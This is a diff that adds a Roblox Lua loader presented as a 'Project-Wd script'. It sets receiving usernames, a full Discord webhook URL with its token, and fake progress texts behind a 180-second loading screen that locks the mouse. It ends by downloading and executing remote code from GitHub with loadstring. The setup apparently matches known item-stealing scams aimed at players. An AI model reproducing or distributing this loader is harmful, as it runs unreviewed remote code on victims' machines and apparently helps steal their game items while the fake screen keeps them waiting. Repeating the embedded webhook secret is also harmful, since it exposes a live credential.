@@ -1,0 +1,12 @@
+UserName = "baolongfarming2"
+UserName2 = "baolongfarming2"
+Webhook = "https://discord.com/api/webhooks/1107503794629115956/MaoRdrUcY9OCxPbvNaGmOBJPsBiMA3DeMCWu6--MVwRuZVNQFQm-G0TCe65Es5kEDUXc"
+_G.LoadingScreen = true
+_G.AntiLeave = false
+_G.MouseLock = true 
+_G.ScriptName = "Project-Wd script"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Script Loading..."
+_G.ThirdText = "Almost Done..."
+_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
